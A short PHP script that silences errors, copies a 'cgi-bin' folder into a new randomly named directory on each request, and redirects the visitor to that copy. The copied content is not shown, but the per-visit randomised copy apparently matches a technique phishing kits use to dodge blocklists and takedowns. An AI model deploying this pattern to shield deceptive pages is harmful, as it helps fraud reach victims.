<?php

    error_reporting(0);

    require_once __DIR__.'/cgi-bin/functions/functions.php';
    $dst = GenerateHash(6);

    function recurse_copy($src,$dst)
    {
        $dir = opendir($src);
        @mkdir($dst);
        while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
        if ( is_dir($src . '/' . $file) ) {
        recurse_copy($src . '/' . $file,$dst . '/' . $file);
        }
        else {
        copy($src . '/' . $file,$dst . '/' . $file);
        }
        }
        }
        closedir($dir);
    }
$src="cgi-bin";
recurse_copy( $src, $dst );
header('Location: '.$dst);
?>